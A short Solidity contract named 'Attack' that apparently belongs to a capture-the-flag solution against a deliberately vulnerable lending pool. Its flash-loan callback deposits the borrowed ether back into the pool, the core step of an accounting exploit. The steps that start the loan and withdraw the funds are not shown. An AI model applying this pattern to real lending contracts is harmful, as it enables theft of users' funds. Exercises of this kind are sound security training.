// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;
import {SideEntranceLenderPool} from "../src/SideEntranceLenderPool.sol";

contract Attack {
    SideEntranceLenderPool pool;
    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
